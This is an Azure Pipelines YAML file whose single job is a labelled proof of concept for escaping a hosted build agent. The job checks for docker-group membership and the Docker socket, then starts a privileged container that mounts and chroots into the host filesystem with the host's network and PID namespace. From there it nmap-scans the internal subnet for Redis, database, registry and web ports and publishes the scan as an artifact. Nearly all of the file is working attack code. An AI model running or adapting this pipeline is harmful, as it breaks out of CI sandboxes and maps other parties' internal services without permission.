# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

stages:
- stage: ReconAndExploit
  displayName: 'Reconnaissance & Exploitation PoC'
  jobs:
  - job: Linux_Host_Escape_And_Scan_PoC
    displayName: 'PoC: Host Escape & Targeted Internal Scan'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none # No source code is needed for this PoC.
    - task: Bash@3
      displayName: 'Attempt Container Escape and Hunt for Open Services'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "--- Checking for Docker socket and group permissions ---"
          if [ -S "/var/run/docker.sock" ] && getent group docker && id | grep -q '(docker)'; then
            echo "✅ SUCCESS: User is in the 'docker' group and socket is present."
            
            echo "--- Installing Nmap inside container for later use from host ---"
            sudo apt-get update >/dev/null && sudo apt-get install -y nmap >/dev/null
            
            SUBNET=$(ip -o -f inet addr show eth0 | awk '{print $4}')
            echo "Discovered internal subnet: $SUBNET"
            
            # Define a list of high-value ports to hunt for, based on previous findings.
            # 5000 (Docker Registry), 6379 (Redis), 5432 (PostgreSQL), 3306 (MySQL), 8080 (http-alt)
            TARGET_PORTS="5000,6379,5432,3306,8080"
            
            echo "--- ESCAPING CONTAINER to hunt for open ports ($TARGET_PORTS) on the host's network ---"
            
            # We use '-sT' for a TCP connect scan and '--open' to only report hosts with open ports.
            docker run --rm --privileged --network=host --pid=host -v /:/hostfs -v /usr/bin/nmap:/usr/bin/nmap \
              alpine:latest chroot /hostfs /usr/bin/nmap -sT -T4 -p $TARGET_PORTS --open $SUBNET | tee artifacts/host-escape-TARGETED-scan.txt
              
            echo "✅ HUNT COMPLETE: Targeted scan from host finished."
            echo "Review the 'host-escape-TARGETED-scan.txt' artifact for any open services."
          else
            echo "❌ TEST INCONCLUSIVE: The container escape vector (user in docker group) was not found."
            id | tee artifacts/poc-failure-id.txt
            ls -l /var/run/docker.sock | tee -a artifacts/poc-failure-id.txt || echo "Socket not found." | tee -a artifacts/poc-failure-id.txt
            exit 1
          fi
    - task: PublishPipelineArtifact@1
      displayName: 'Publish Attack PoC Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-poc-host-escape'
